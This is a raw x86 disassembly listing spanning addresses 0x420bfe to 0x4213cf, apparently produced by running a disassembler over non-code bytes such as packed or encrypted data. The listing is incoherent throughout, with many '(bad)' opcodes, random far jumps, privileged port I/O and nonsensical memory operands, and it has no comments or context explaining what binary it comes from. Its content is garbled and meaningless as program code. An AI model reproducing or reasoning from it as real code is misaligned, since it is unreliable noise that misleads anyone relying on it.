  420bfe:	dec    ecx
  420bff:	cld    
  420c00:	test   eax,0x241e7c96
  420c05:	dec    edx
  420c06:	jne    0x420c80
  420c08:	loope  0x420c10
  420c0a:	mov    ds:0xff1ee10d,eax
  420c0f:	cmp    ebp,ecx
  420c11:	sub    cl,bl
  420c13:	cld    
  420c14:	cwde   
  420c15:	sbb    DWORD PTR [eax*1+0x780f658d],eax
  420c1c:	gs inc edx
  420c1e:	(bad)  
  420c1f:	imul   edi,DWORD PTR [edi-0x38212bde],0x34
  420c26:	pop    esp
  420c27:	lods   eax,DWORD PTR ds:[esi]
  420c28:	retf   0xd609
  420c2b:	pop    ds
  420c2c:	outs   dx,BYTE PTR ds:[esi]
  420c2d:	xor    ah,dh
  420c2f:	sbb    ch,BYTE PTR [edi+eax*2]
  420c32:	ficom  DWORD PTR [eax-0x33d276ba]
  420c38:	mov    al,0x38
  420c3a:	cmp    cl,BYTE PTR [eax+esi*4+0x6dd78eaa]
  420c41:	sbb    dh,BYTE PTR [edx]
  420c43:	enter  0x5439,0x48
  420c47:	sub    ecx,DWORD PTR [edx]
  420c49:	(bad)  
  420c4a:	jmp    0x420be8
  420c4c:	sub    BYTE PTR [esi],cl
  420c4e:	and    BYTE PTR [ebx-0x7cfbbc84],dh
  420c54:	cwde   
  420c55:	cmp    al,0xce
  420c57:	jne    0x420c17
  420c59:	push   esp
  420c5a:	(bad)  
  420c5b:	lds    eax,FWORD PTR [esi+0x44]
  420c5e:	(bad)  
  420c5f:	cli    
  420c60:	mov    al,0xf7
  420c62:	sub    DWORD PTR [eax-0x2ed2147a],esp
  420c68:	dec    edi
  420c69:	jecxz  0x420c5f
  420c6b:	push   0xc99f8a93
  420c70:	jmp    0x55d5:0x661cf54c
  420c77:	stos   BYTE PTR es:[edi],al
  420c78:	jmp    0x420bfb
  420c7a:	jb     0x420c3f
  420c7c:	loope  0x420c6e
  420c7e:	int3   
  420c7f:	imul   edi,DWORD PTR [ecx],0x99e8a2aa
  420c85:	fld    DWORD PTR [ebx+0x34]
  420c88:	push   ebx
  420c89:	adc    BYTE PTR [eax-0x7eef7617],ah
  420c8f:	popa   
  420c90:	in     eax,0x13
  420c92:	push   edi
  420c93:	adc    cl,dh
  420c95:	push   eax
  420c96:	ins    DWORD PTR es:[edi],dx
  420c97:	pop    eax
  420c98:	les    edi,FWORD PTR [ecx+0x113ffe51]
  420c9e:	retf   0xe275
  420ca1:	jmp    0x4a90a2c
  420ca6:	inc    esp
  420ca7:	ja     0x420c75
  420ca9:	iret   
  420caa:	sub    BYTE PTR [edi],ah
  420cac:	bound  eax,QWORD PTR [esi-0x6a14d289]
  420cb2:	mov    ds:0xaacb626e,al
  420cb7:	cmp    DWORD PTR [edx+eax*1+0x36],ecx
  420cbb:	aas    
  420cbc:	push   ss
  420cbd:	jge    0x420c97
  420cbf:	jno    0x420c7a
  420cc1:	jl     0x420d0e
  420cc3:	pop    edx
  420cc4:	adc    eax,DWORD PTR [edx-0xae07d20]
  420cca:	pop    ss
  420ccb:	push   esi
  420ccc:	sub    BYTE PTR [ebp+0x1f57bda3],dh
  420cd2:	push   ds
  420cd3:	mov    bh,0x3e
  420cd5:	ret    0x8531
  420cd8:	mov    al,0xf
  420cda:	fnstsw WORD PTR [esp+ecx*2+0x4105348f]
  420ce1:	daa    
  420ce2:	xor    al,0xef
  420ce4:	jmp    0xdd38:0x527c89f8
  420ceb:	xor    DWORD PTR [edi],0xfddcb9dd
  420cf1:	sub    ch,BYTE PTR [ebx+ebx*1]
  420cf4:	or     DWORD PTR [ebx+0x32dbc2fa],eax
  420cfa:	ins    BYTE PTR es:[edi],dx
  420cfb:	cli    
  420cfc:	stos   BYTE PTR es:[edi],al
  420cfd:	sub    al,0x5c
  420cff:	mul    DWORD PTR [ecx+edx*8-0x1c]
  420d03:	jns    0x420ccc
  420d05:	push   ebp
  420d06:	xchg   esp,eax
  420d07:	add    DWORD PTR [ebx-0x5a],edi
  420d0a:	push   eax
  420d0b:	inc    ebx
  420d0c:	inc    eax
  420d0d:	iret   
  420d0e:	es mov dh,0x55
  420d11:	pop    esp
  420d12:	stos   DWORD PTR es:[edi],eax
  420d13:	loop   0x420cfe
  420d15:	shl    DWORD PTR [eax-0x34],0x5a
  420d19:	inc    eax
  420d1a:	ins    BYTE PTR es:[edi],dx
  420d1b:	pop    esi
  420d1c:	sub    eax,DWORD PTR [edx+0x784f0f3e]
  420d22:	mov    cl,0xf6
  420d24:	out    dx,al
  420d25:	jnp    0x420d3b
  420d27:	hlt    
  420d28:	pop    esp
  420d29:	adc    eax,0x2d492504
  420d2e:	inc    esp
  420d2f:	mov    edi,0x83efdbe9
  420d34:	or     ebp,DWORD PTR [esi+0x59]
  420d37:	ret    
  420d38:	ins    DWORD PTR es:[edi],dx
  420d39:	dec    eax
  420d3a:	jecxz  0x420d63
  420d3c:	imul   eax,DWORD PTR [ebx],0x97e610cb
  420d42:	cmp    bh,BYTE PTR [ebx-0x6a4e1ee9]
  420d48:	popf   
  420d49:	sub    BYTE PTR ds:0x98aeda09,0xf4
  420d50:	or     ebx,eax
  420d52:	jle    0x420d06
  420d54:	dec    eax
  420d55:	adc    ch,BYTE PTR [ebx]
  420d57:	lods   al,BYTE PTR ds:[esi]
  420d58:	jg     0x420d8a
  420d5a:	dec    esp
  420d5b:	xchg   DWORD PTR [edi],ebx
  420d5d:	or     DWORD PTR [edi-0x296ae056],0x5c9b7e9f
  420d67:	lahf   
  420d68:	fld    QWORD PTR [edi+0x30a667d2]
  420d6e:	mov    ds:0x6b71a28b,eax
  420d73:	push   0xa78310dd
  420d78:	push   es
  420d79:	imul   BYTE PTR [ecx]
  420d7b:	lods   al,BYTE PTR ds:[esi]
  420d7c:	and    al,0xc0
  420d7e:	and    ebx,ebx
  420d80:	(bad)  
  420d82:	(bad)  
  420d83:	out    0x7d,al
  420d85:	(bad)  [ecx-0x45]
  420d88:	xchg   esp,eax
  420d89:	fld    QWORD PTR [eax-0x1]
  420d8c:	daa    
  420d8d:	ror    DWORD PTR [edx+esi*2+0x40],cl
  420d91:	cdq    
  420d92:	and    al,0x30
  420d94:	mov    ebp,0x197bd049
  420d99:	test   DWORD PTR [edi],edx
  420d9b:	jle    0x420d76
  420d9d:	ins    BYTE PTR es:[edi],dx
  420d9e:	push   edx
  420d9f:	test   BYTE PTR [ebp+0x3e],dh
  420da2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420da3:	push   ebp
  420da4:	mov    bh,0x83
  420da6:	sahf   
  420da7:	addr16 mov esp,0x4d3137e9
  420dad:	cs push esp
  420daf:	fcmovbe st,st(1)
  420db1:	xchg   esi,eax
  420db2:	scas   eax,DWORD PTR es:[edi]
  420db3:	adc    bl,BYTE PTR [ecx+0x3205f9ac]
  420db9:	loope  0x420d8f
  420dbb:	out    0x41,al
  420dbd:	dec    eax
  420dbe:	sahf   
  420dbf:	add    ah,BYTE PTR [esi*8-0x5892dec1]
  420dc6:	dec    DWORD PTR [esp+edx*4-0x12c847ce]
  420dcd:	aam    0xf1
  420dcf:	mov    esp,ebx
  420dd1:	xor    bh,BYTE PTR [edx]
  420dd3:	xchg   ecx,eax
  420dd4:	jo     0x420dec
  420dd6:	add    BYTE PTR ss:[ebp-0x10c131f8],0x77
  420dde:	inc    eax
  420ddf:	dec    esp
  420de0:	cmp    eax,DWORD PTR [edi]
  420de2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420de3:	stc    
  420de4:	xchg   edi,eax
  420de5:	mov    BYTE PTR [ebp+0x98fc578],bh
  420deb:	nop
  420dec:	jbe    0x420e69
  420dee:	ja     0x420e32
  420df0:	xchg   BYTE PTR [ecx],bl
  420df2:	cdq    
  420df3:	ss mov bl,0x75
  420df6:	gs push ebp
  420df8:	repz dec eax
  420dfa:	rol    DWORD PTR [esi+0x14],0x38
  420dfe:	mov    ds:0x1275d80a,al
  420e03:	aaa    
  420e04:	jmp    0x4a81:0xda75c19b
  420e0b:	arpl   bx,di
  420e0d:	scas   al,BYTE PTR es:[edi]
  420e0e:	scas   eax,DWORD PTR es:[edi]
  420e0f:	mov    eax,0xe2721c01
  420e14:	sbb    al,0xaf
  420e16:	out    dx,eax
  420e17:	fs inc ecx
  420e19:	aam    0xe4
  420e1b:	pop    ss
  420e1c:	push   cs
  420e1d:	dec    edx
  420e1e:	retf   0x67b8
  420e21:	sub    eax,DWORD PTR [eax]
  420e23:	jp     0x420e8a
  420e25:	push   ebp
  420e26:	inc    eax
  420e27:	push   esp
  420e28:	mov    esp,0xd90b434d
  420e2d:	adc    esi,edi
  420e2f:	fnstcw WORD PTR [eax+0x53]
  420e32:	pop    ebx
  420e33:	fs repz mov bl,0xf2
  420e37:	push   ecx
  420e38:	sub    bh,BYTE PTR [ebp+0x3522240a]
  420e3e:	dec    ecx
  420e3f:	pushf  
  420e40:	add    ch,0xab
  420e43:	sahf   
  420e44:	cld    
  420e45:	jns    0x420e1a
  420e47:	rcl    DWORD PTR [esi+0x6bfcd88f],0x48
  420e4e:	jo     0x420e75
  420e50:	add    al,0xd5
  420e52:	gs popa 
  420e54:	sub    eax,0x219a36d9
  420e59:	in     eax,dx
  420e5a:	fcmovnu st,st(3)
  420e5c:	push   ds
  420e5d:	mov    al,0xaa
  420e5f:	test   BYTE PTR [eax],ah
  420e61:	pop    esi
  420e62:	hlt    
  420e63:	sbb    BYTE PTR [edx],dl
  420e65:	adc    eax,0x2cc7347c
  420e6a:	lods   eax,DWORD PTR ds:[esi]
  420e6b:	into   
  420e6c:	imul   esi,DWORD PTR [ecx+0x36],0xffffff9e
  420e70:	fdivr  st(2),st
  420e72:	jbe    0x420e8f
  420e74:	retf   
  420e75:	jg     0x420e8f
  420e77:	pop    eax
  420e78:	mov    bl,0xc9
  420e7a:	idiv   BYTE PTR [ecx-0x7f]
  420e7d:	xchg   ebp,eax
  420e7e:	iret   
  420e7f:	xchg   ecx,eax
  420e80:	sbb    al,dl
  420e82:	push   ss
  420e83:	int3   
  420e84:	cmp    eax,0x5a4998fc
  420e89:	push   es
  420e8a:	jp     0x420ee1
  420e8c:	ret    0xa932
  420e8f:	or     bl,al
  420e91:	xlat   BYTE PTR ds:[ebx]
  420e92:	fmulp  st(7),st
  420e94:	or     bl,BYTE PTR [eax]
  420e96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e97:	jno    0x420e6e
  420e99:	mov    ch,0xd8
  420e9b:	adc    BYTE PTR [esi],bh
  420e9d:	es leave 
  420e9f:	inc    esi
  420ea0:	stos   BYTE PTR es:[edi],al
  420ea1:	and    bl,ah
  420ea3:	aas    
  420ea4:	imul   ecx,DWORD PTR [esi+ebx*8+0x58],0x44
  420ea9:	test   eax,0xda0d856c
  420eae:	loope  0x420ede
  420eb0:	ror    DWORD PTR [eax],0xa8
  420eb3:	enter  0x3924,0xa2
  420eb7:	sbb    edx,DWORD PTR [ebx-0x30de1e89]
  420ebd:	adc    al,0x41
  420ebf:	cmp    ch,BYTE PTR [esi+0x41]
  420ec2:	and    eax,edi
  420ec4:	imul   ebx,DWORD PTR [edi],0x55ff3a8f
  420eca:	aam    0x24
  420ecc:	test   cl,0x5c
  420ecf:	out    dx,al
  420ed0:	push   cs
  420ed1:	mov    al,0xb3
  420ed3:	popf   
  420ed4:	out    0xb3,al
  420ed6:	and    al,0xa8
  420ed8:	add    BYTE PTR [ebx+0x37],bl
  420edb:	pusha  
  420edc:	cmp    cl,dh
  420ede:	xchg   ebx,esi
  420ee0:	pusha  
  420ee1:	loope  0x420e9e
  420ee3:	inc    ebx
  420ee4:	cdq    
  420ee5:	cmp    DWORD PTR [eax],edx
  420ee7:	xchg   ebp,eax
  420ee8:	popa   
  420ee9:	enter  0x7b82,0xd0
  420eed:	mov    cl,0xc2
  420eef:	mov    ds:0xdd76fa5d,al
  420ef4:	repnz stos DWORD PTR es:[edi],eax
  420ef6:	loopne 0x420f55
  420ef8:	(bad)  
  420ef9:	mov    esi,0x50a58c3f
  420efe:	mov    esi,0xcb5d0f32
  420f03:	and    ebx,esp
  420f05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420f06:	repz push edi
  420f08:	xchg   edx,eax
  420f09:	out    dx,al
  420f0a:	mov    ch,0xdd
  420f0c:	mov    edi,0xf92ab05c
  420f11:	xchg   ecx,eax
  420f12:	aad    0xd4
  420f14:	rcl    DWORD PTR [esi-0x682466b],1
  420f1a:	in     al,dx
  420f1b:	jmp    0xb0c811e8
  420f20:	fs cdq 
  420f22:	inc    eax
  420f23:	push   0xcc8d2d82
  420f28:	xor    ah,BYTE PTR [ebx+0x25]
  420f2b:	fld    TBYTE PTR [ebp-0x4e2f7e3]
  420f31:	adc    ch,BYTE PTR [edx]
  420f33:	out    0x1,al
  420f35:	cmp    dh,cl
  420f37:	adc    BYTE PTR [esi+0x5b87d556],ah
  420f3d:	test   BYTE PTR [ecx+0x5f1ad25a],0x9c
  420f44:	mov    edi,0xfd3fd369
  420f49:	repnz (bad) 
  420f4b:	cli    
  420f4c:	outs   dx,DWORD PTR ds:[esi]
  420f4d:	sbb    al,0xc3
  420f4f:	cdq    
  420f50:	jno    0x420f60
  420f52:	xchg   BYTE PTR [esi-0x48],dh
  420f55:	int3   
  420f56:	mov    BYTE PTR [ecx-0x40],bl
  420f59:	dec    esp
  420f5a:	xor    eax,0x1f992137
  420f5f:	jmp    0x5ae47e14
  420f64:	jo     0x420f5c
  420f66:	sub    BYTE PTR [esi+0x47],bh
  420f69:	in     al,0x6d
  420f6b:	push   ecx
  420f6c:	cmp    BYTE PTR [ebx+eax*8+0x6d],cl
  420f70:	mov    eax,ds:0xdf760b4b
  420f75:	es push ecx
  420f77:	push   ebp
  420f78:	push   cs
  420f79:	mov    eax,0xd3437144
  420f7e:	es es jnp 0x420f7b
  420f82:	rol    cl,cl
  420f84:	mov    bl,0x77
  420f86:	push   0xffffffbc
  420f88:	adc    DWORD PTR [ebp+0x2c],edx
  420f8b:	int    0x8f
  420f8d:	or     edx,DWORD PTR [ecx+esi*4+0xfa5a4]
  420f94:	xor    ebx,edi
  420f96:	inc    ecx
  420f98:	call   0x8fcf:0x4fed244
  420f9f:	mov    eax,ds:0x47f967ca
  420fa4:	retf   
  420fa5:	jl     0x420fe1
  420fa7:	lds    edx,FWORD PTR es:[edx+0x72]
  420fab:	adc    DWORD PTR [ecx+0x44e1f755],eax
  420fb1:	das    
  420fb2:	loop   0x420f4c
  420fb4:	mov    ah,0x32
  420fb6:	mov    cs,ecx
  420fb8:	out    0x84,al
  420fba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420fbb:	add    eax,0x153314ec
  420fc0:	cld    
  420fc1:	je     0x420ff5
  420fc3:	pop    edx
  420fc4:	int3   
  420fc5:	xor    dh,BYTE PTR [edi-0x77]
  420fc8:	popa   
  420fc9:	adc    al,0xfd
  420fcb:	cdq    
  420fcc:	daa    
  420fcd:	and    ebp,DWORD PTR [edx]
  420fcf:	imul   edi,DWORD PTR [ebx-0x7dfc3be2],0x22
  420fd6:	das    
  420fd7:	mov    dl,0x63
  420fd9:	dec    eax
  420fda:	push   edx
  420fdb:	push   ebp
  420fdc:	out    dx,eax
  420fdd:	push   0xffffffec
  420fdf:	mov    al,gs:0x96c62e41
  420fe5:	xor    cl,ah
  420fe7:	nop
  420fe8:	cmp    eax,0xebe1debd
  420fed:	dec    ecx
  420fee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420fef:	ret    
  420ff0:	daa    
  420ff1:	adc    DWORD PTR [ebp+0x7],0x54
  420ff5:	scas   eax,DWORD PTR es:[edi]
  420ff6:	sub    DWORD PTR [edi],edi
  420ff8:	inc    ebx
  420ff9:	mov    ebp,0x38fdf750
  420ffe:	lahf   
  420fff:	lods   al,BYTE PTR ds:[esi]
  421000:	adc    cl,BYTE PTR [esi+edi*4-0xd]
  421004:	ffreep st(6)
  421006:	cmp    al,0xff
  421008:	sub    eax,ebx
  42100a:	lea    ecx,[ebx+0x65]
  42100d:	push   es
  42100e:	mov    ebx,0x4b163e5a
  421013:	clc    
  421014:	cmp    dh,0x84
  421017:	in     al,dx
  421018:	cld    
  421019:	cs mov ecx,0x56708224
  42101f:	dec    ebx
  421020:	dec    esi
  421021:	imul   esp,DWORD PTR [edx+0x41],0x1f57000a
  421028:	lods   eax,DWORD PTR ds:[esi]
  421029:	retf   
  42102a:	cmc    
  42102b:	sub    al,0x65
  42102d:	push   ds
  42102e:	je     0x421044
  421030:	jmp    FWORD PTR [ebx-0x5f094358]
  421036:	arpl   WORD PTR [ecx],si
  421038:	stc    
  421039:	cmp    cl,BYTE PTR [ebx]
  42103b:	aaa    
  42103c:	sub    eax,0x6e008a6c
  421041:	mov    bh,BYTE PTR [esi+0x22c88d38]
  421047:	sub    al,0x22
  421049:	jne    0x420fcf
  42104b:	mov    DWORD PTR [ecx-0x22],0x309fdc6d
  421052:	dec    ebx
  421053:	dec    ebp
  421054:	xchg   esp,eax
  421055:	rcl    DWORD PTR [ebx-0x7f],0xc7
  421059:	push   cs
  42105a:	adc    al,0x52
  42105c:	scas   eax,DWORD PTR es:[edi]
  42105d:	fist   DWORD PTR [eax+0x3a6acd24]
  421063:	xchg   esi,eax
  421064:	adc    eax,0x9baa454d
  421069:	mov    ds:0xe7ccdc36,al
  42106e:	std    
  42106f:	mov    dl,0xb5
  421071:	aaa    
  421072:	aas    
  421073:	sahf   
  421074:	fdivr  st,st(0)
  421076:	pop    es
  421077:	inc    esp
  421078:	(bad)  [eax]
  42107a:	mov    esi,0x28c212a0
  42107f:	sub    ah,0x11
  421082:	call   0xe108:0x9f13f1cc
  421089:	les    edi,FWORD PTR [edx-0x42]
  42108c:	addr16 sti 
  42108e:	sub    BYTE PTR [ebp+0x62],0xdd
  421092:	out    0xbe,al
  421094:	ins    BYTE PTR es:[edi],dx
  421095:	pop    ebp
  421096:	xor    dl,BYTE PTR [ebp-0x632bd55f]
  42109c:	add    eax,0xbd0c39fc
  4210a1:	inc    ecx
  4210a2:	loop   0x42105e
  4210a4:	xor    al,0xfa
  4210a6:	test   al,0x72
  4210a8:	cdq    
  4210a9:	call   0xcffb:0xfb410117
  4210b0:	int    0x0
  4210b2:	pop    ecx
  4210b3:	inc    esp
  4210b4:	pop    ebp
  4210b5:	outs   dx,DWORD PTR ds:[esi]
  4210b6:	je     0x421078
  4210b8:	loopne 0x4210d6
  4210ba:	aad    0xdc
  4210bc:	adc    eax,0xcbb3854
  4210c1:	scas   al,BYTE PTR es:[edi]
  4210c2:	imul   edi,DWORD PTR [esi+0xb],0x5a
  4210c6:	es add eax,esi
  4210c9:	push   es
  4210ca:	jae    0x4210ce
  4210cc:	dec    esi
  4210cd:	stc    
  4210ce:	jmp    0x611a:0x13ee1e8f
  4210d5:	mov    ecx,0x4759903d
  4210da:	std    
  4210db:	ja     0x4210c9
  4210dd:	int3   
  4210de:	pop    es
  4210df:	jae    0x421098
  4210e1:	lock ret 
  4210e3:	and    ch,BYTE PTR [esi]
  4210e5:	in     eax,dx
  4210e6:	fsubr  DWORD PTR [ebx]
  4210e8:	pushf  
  4210e9:	cmp    BYTE PTR [edi-0x11f7fd1e],ch
  4210ef:	call   0x54c25117
  4210f4:	add    dh,ch
  4210f6:	lock cs push ebp
  4210f9:	int    0xcf
  4210fb:	(bad)  
  4210fc:	and    BYTE PTR [ebx-0x1a8252e9],ch
  421102:	cmp    ebx,ecx
  421104:	aam    0xcd
  421106:	or     ecx,esi
  421108:	data16 ja 0x4210c4
  42110b:	adc    eax,DWORD PTR [edi+ebx*1]
  42110e:	aas    
  42110f:	sub    eax,0xf6d85b47
  421114:	or     BYTE PTR [ebx+edx*4+0x1675ba1f],ah
  42111b:	xchg   esi,eax
  42111c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42111d:	mov    ds:0xc0f5dd43,al
  421122:	mov    ebp,0xe690fc43
  421127:	(bad)  
  421129:	xor    BYTE PTR [edx],dh
  42112b:	std    
  42112c:	dec    ebx
  42112d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42112e:	or     al,0x4e
  421130:	iret   
  421131:	pop    ds
  421132:	jp     0x421121
  421134:	mov    ds:0x5d9cd157,al
  421139:	push   esp
  42113a:	pop    ds
  42113b:	push   ss
  42113c:	jnp    0x4210e8
  42113e:	aas    
  42113f:	xor    ebx,edx
  421141:	dec    eax
  421142:	add    eax,ecx
  421144:	rol    BYTE PTR [ebp+0x32],cl
  421147:	and    BYTE PTR [ebx],0xce
  42114a:	out    0x5e,eax
  42114c:	fdiv   QWORD PTR [edi]
  42114e:	mov    al,0xd3
  421150:	jg     0x4211c4
  421152:	sahf   
  421153:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421154:	jp     0x421153
  421156:	and    al,0xbe
  421159:	fld    DWORD PTR [edx+0x2d]
  42115c:	out    dx,al
  42115d:	dec    ebp
  42115e:	adc    esp,DWORD PTR [esi]
  421160:	or     BYTE PTR ds:0xb966e07,dl
  421166:	out    dx,al
  421167:	mov    ebx,0xb41af9e
  42116c:	stc    
  42116d:	sbb    BYTE PTR [edi+0x5a690798],al
  421173:	pop    es
  421174:	scas   al,BYTE PTR es:[edi]
  421175:	pop    edi
  421176:	in     eax,0xfa
  421178:	xor    ebx,DWORD PTR [eax+ebp*4+0x3196fabe]
  42117f:	repnz sbb BYTE PTR [ebx+0x4803c790],dh
  421186:	int3   
  421187:	(bad)  
  421188:	std    
  421189:	push   eax
  42118a:	xor    edx,DWORD PTR [ebp+0x5e]
  42118d:	or     esp,DWORD PTR [esi-0x65]
  421190:	nop
  421191:	inc    edx
  421192:	or     dh,ah
  421194:	pop    ebp
  421195:	adc    al,0x95
  421197:	cmp    ecx,DWORD PTR [eax+0x5d62b085]
  42119d:	cmp    eax,0x9aaaf921
  4211a2:	dec    eax
  4211a3:	js     0x4211e2
  4211a5:	adc    dh,bl
  4211a7:	mov    al,0x29
  4211a9:	fisttp QWORD PTR ds:0x524c7d67
  4211af:	fiadd  DWORD PTR [edi-0x7a04858a]
  4211b5:	jg     0x42119b
  4211b7:	jae    0x421224
  4211b9:	les    ecx,FWORD PTR ds:0xbd7ad68
  4211bf:	jbe    0x42122f
  4211c1:	jnp    0x421157
  4211c3:	jmp    0x421211
  4211c5:	push   ss
  4211c6:	xor    BYTE PTR [ebx+0x18],0x23
  4211ca:	xchg   esi,eax
  4211cb:	pop    ecx
  4211cc:	rcr    DWORD PTR [ecx-0x26a1de2d],1
  4211d2:	sub    ch,bh
  4211d4:	jge    0x4211c7
  4211d6:	jnp    0x4211b0
  4211d8:	and    al,0x79
  4211da:	mov    eax,ds:0x70bff120
  4211df:	neg    DWORD PTR [edx-0x40]
  4211e2:	fs into 
  4211e4:	ja     0x42119c
  4211e6:	sbb    edi,DWORD PTR ds:0xb459668d
  4211ec:	cmp    bh,BYTE PTR [ebx]
  4211ee:	imul   edx,DWORD PTR [edx+edi*4],0x237581df
  4211f5:	add    BYTE PTR [ebp-0x7df61dc7],ah
  4211fb:	or     eax,DWORD PTR [ebx]
  4211fd:	pushf  
  4211fe:	mov    cl,0xf8
  421200:	in     al,0xfb
  421202:	ret    0xf5be
  421205:	sbb    BYTE PTR [ebx-0x68],cl
  421208:	test   DWORD PTR [edx],esi
  42120a:	loope  0x4211f7
  42120c:	retf   
  42120d:	rsqrtps xmm3,xmm0
  421210:	or     ebp,DWORD PTR [ebx]
  421212:	push   edi
  421213:	mov    al,0x32
  421215:	in     eax,0xc0
  421217:	inc    ecx
  421218:	inc    ebp
  421219:	mov    eax,ds:0xbdd0cc17
  42121e:	xchg   ebp,eax
  42121f:	add    eax,0xfffffffb
  421222:	cmp    ebp,ebx
  421224:	pop    edx
  421225:	out    0x4b,al
  421227:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421228:	outs   dx,DWORD PTR ds:[esi]
  421229:	sbb    esi,DWORD PTR [edx-0x47]
  42122c:	sub    edx,DWORD PTR [edx-0x55ff1c75]
  421232:	jo     0x42124b
  421234:	inc    esp
  421235:	icebp  
  421236:	popf   
  421237:	repz sbb DWORD PTR [ebp+0x75454b6c],edi
  42123e:	cs nop
  421240:	xor    ah,BYTE PTR [esi-0x585319b7]
  421246:	cmp    DWORD PTR [ecx+eiz*2],edi
  421249:	sbb    BYTE PTR [ecx-0x6cc2bd52],cl
  42124f:	inc    ecx
  421250:	mov    ah,0x45
  421252:	push   ecx
  421253:	push   ebx
  421254:	aas    
  421255:	and    al,0x8b
  421257:	add    cl,BYTE PTR [ecx-0x211d77ea]
  42125d:	jae    0x421243
  42125f:	jae    0x421242
  421261:	jno    0x42127e
  421263:	sub    BYTE PTR [edx+0x5d],dh
  421266:	scas   al,BYTE PTR es:[edi]
  421267:	into   
  421268:	add    eax,0x59078154
  42126d:	jecxz  0x42122c
  42126f:	mov    esi,0x2c5020a5
  421274:	and    DWORD PTR [ebx],edi
  421276:	imul   ebx,DWORD PTR [esi+0x17],0x388e6b46
  42127d:	repnz push ebp
  42127f:	xchg   ebp,eax
  421280:	mov    eax,0x8f4d2565
  421285:	cld    
  421286:	mov    cl,0x3
  421288:	add    DWORD PTR [ecx-0x19],esi
  42128b:	cmp    eax,0x74a842b1
  421290:	aad    0x6e
  421292:	mov    WORD PTR [ebx-0x3e66913f],cs
  421298:	dec    eax
  421299:	fstp   st(2)
  42129b:	add    ah,cl
  42129d:	stc    
  42129e:	or     ebp,DWORD PTR [edi-0x7ec148be]
  4212a4:	add    eax,0x66729c61
  4212a9:	jae    0x4212b6
  4212ab:	pop    eax
  4212ac:	xor    eax,0x86cbceea
  4212b1:	es sti 
  4212b3:	cmp    ebx,DWORD PTR [ebx+0x61ded508]
  4212b9:	js     0x421241
  4212bb:	int    0x75
  4212bd:	in     eax,dx
  4212be:	jno    0x4212a2
  4212c0:	out    dx,eax
  4212c1:	out    dx,eax
  4212c2:	pusha  
  4212c3:	and    dl,BYTE PTR [eax-0x1fa5231d]
  4212c9:	pop    eax
  4212ca:	xor    al,0xc
  4212cc:	add    DWORD PTR [esi+edx*2],ebp
  4212cf:	xchg   ecx,eax
  4212d0:	sti    
  4212d1:	mov    esp,0x2b336986
  4212d6:	shl    esi,cl
  4212d8:	xchg   ebp,eax
  4212d9:	cmp    eax,0x4fa8eb46
  4212de:	add    esp,edi
  4212e0:	adc    cl,BYTE PTR [eax+0x23]
  4212e3:	int3   
  4212e4:	jmp    0x421320
  4212e6:	xor    DWORD PTR [ebp-0x1f],0xeca2781d
  4212ed:	mov    al,ds:0xc6b70d81
  4212f2:	(bad)  
  4212f3:	dec    edx
  4212f4:	scas   eax,DWORD PTR es:[edi]
  4212f5:	out    dx,al
  4212f6:	arpl   WORD PTR [edi+0x6b],cx
  4212f9:	ins    DWORD PTR es:[edi],dx
  4212fa:	rol    ebx,1
  4212fc:	inc    eax
  4212fd:	mov    esi,0x564052ef
  421302:	jns    0x4212ac
  421304:	sar    BYTE PTR [esi+0x2e57e219],0x94
  42130b:	xchg   ebp,eax
  42130c:	xchg   edx,eax
  42130d:	ret    
  42130e:	inc    eax
  42130f:	div    BYTE PTR [ecx-0x64dab9b5]
  421315:	retf   
  421316:	retf   
  421317:	outs   dx,DWORD PTR ds:[esi]
  421318:	imul   edx,DWORD PTR cs:[ecx+0x6ccbe8a2],0xffffff87
  421320:	ds retf 0xf1f4
  421324:	rol    BYTE PTR [ecx-0x1fb89636],0x67
  42132b:	add    DWORD PTR [edi-0x18],edx
  42132e:	cld    
  42132f:	ret    
  421330:	xor    eax,DWORD PTR [edx+0x63ecd820]
  421336:	cmp    edi,DWORD PTR [ebp+0x4e7b75df]
  42133c:	out    dx,eax
  42133d:	fwait
  42133e:	shl    BYTE PTR [eax+0x56f81c5d],1
  421344:	mov    ds:0xfb4db42e,al
  421349:	je     0x4213aa
  42134b:	mov    dl,0xd1
  42134d:	cs push cs
  42134f:	test   BYTE PTR [eax],0x8d
  421352:	pop    ebp
  421353:	clc    
  421354:	not    BYTE PTR [esp+edx*8-0x163356b3]
  42135b:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  42135d:	dec    ebx
  42135e:	and    DWORD PTR [esi-0x3a0dc40a],edx
  421364:	add    al,0x70
  421366:	pop    ss
  421367:	add    DWORD PTR [esi-0x52],esi
  42136a:	outs   dx,BYTE PTR ds:[esi]
  42136b:	inc    esi
  42136c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42136d:	data16 cmp al,0x97
  421370:	rol    BYTE PTR [esi-0x4a445849],cl
  421376:	repz and DWORD PTR [edx-0x22],0x7aa5de7e
  42137e:	xor    ecx,DWORD PTR [ebx+0x74d13b0b]
  421384:	fcomi  st,st(4)
  421386:	mov    ebp,0xc6a5a283
  42138b:	sbb    eax,0xbd05fbe
  421390:	and    ecx,DWORD PTR [eax+0x245de7dd]
  421396:	ins    BYTE PTR es:[edi],dx
  421397:	add    BYTE PTR [eax],bl
  421399:	lea    ecx,[ecx+0x54]
  42139c:	sub    ch,BYTE PTR [esi-0x2c]
  42139f:	jbe    0x421409
  4213a1:	test   eax,0xc69f410b
  4213a6:	mov    ds:0x9813e5a,eax
  4213ab:	dec    ebx
  4213ac:	pop    ds
  4213ad:	pop    eax
  4213ae:	inc    eax
  4213af:	jg     0x4213aa
  4213b1:	bnd jne 0x42142c
  4213b4:	and    dl,BYTE PTR [ebx+0x55]
  4213b7:	ret    
  4213b8:	fild   DWORD PTR [edi-0xeaf2a1a]
  4213be:	push   edx
  4213bf:	test   DWORD PTR [ecx-0x3358ce0b],edx
  4213c5:	cmp    eax,0xf962a0c4
  4213ca:	sti    
  4213cb:	gs retf 0x152
  4213cf:	dec    eax
